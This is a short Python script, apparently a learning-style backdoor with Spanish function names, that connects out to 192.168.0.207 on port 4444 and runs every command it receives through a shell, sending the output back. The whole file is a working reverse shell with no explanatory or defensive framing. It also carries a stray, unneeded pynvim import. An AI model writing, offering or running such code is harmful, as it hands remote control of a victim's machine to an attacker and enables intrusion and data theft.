import socket
import subprocess

from pynvim import command

def ejecutar_comando(command):
	return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection.connect(("192.168.0.207", 4444))



while True:
	command = connection.recv(1024)
	resultados_comando = ejecutar_comando(command)
	connection.send(resultados_comando)


connection.close()
